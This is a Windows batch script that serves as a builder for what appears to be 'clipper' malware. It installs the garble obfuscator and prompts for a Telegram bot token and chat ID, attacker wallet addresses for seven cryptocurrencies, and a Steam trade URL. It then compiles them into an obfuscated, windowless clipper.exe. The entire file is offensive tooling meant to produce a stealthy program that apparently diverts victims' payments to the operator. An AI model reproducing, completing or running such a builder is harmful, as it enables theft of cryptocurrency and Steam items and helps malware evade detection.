@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

cls

echo.
echo    ___      _ _    _         
echo   ^| _ ^)_  _^(_^) ^|__^| ^|___ _ _ 
echo   ^| _ ^\ ^|^| ^| ^| / _` / -_^) '_^|
echo   ^|___^/\_,_^|_^|_\__,_\___^|_^|  
echo.
echo.

go install mvdan.cc/garble@latest
if errorlevel 1 (
    echo Failed to install garble
    
    pause
    exit /b 1
)

set /p BOT_TOKEN=Bot token: 
set /p CHAT_ID=Chat ID: 
set /p BTC=BTC addr: 
set /p ETH=ETH addr: 
set /p LTC=LTC addr: 
set /p DOGE=DOGE addr: 
set /p TON=TON addr: 
set /p USDT=USDT TRC addr: 
set /p SOL=SOL addr: 
set /p STEAM=Steam trade url: 

echo Building...

set LDFLAGS=-s -w ^
 -X main.bot_token=%BOT_TOKEN% ^
 -X main.chat_id=%CHAT_ID% ^
 -X main.BtcAddr=%BTC% ^
 -X main.EthAddr=%ETH% ^
 -X main.LtcAddr=%LTC% ^
 -X main.DogeAddr=%DOGE% ^
 -X main.TonAddr=%TON% ^
 -X main.UsdtTrcAddr=%USDT% ^
 -X main.SolAddr=%SOL% ^
 -X main.SteamAddr=%STEAM%

garble -seed=random -tiny build -ldflags="-H=windowsgui %LDFLAGS%" -o clipper.exe 
if errorlevel 1 (
    echo Build failed

    pause
    exit /b 1
)

pause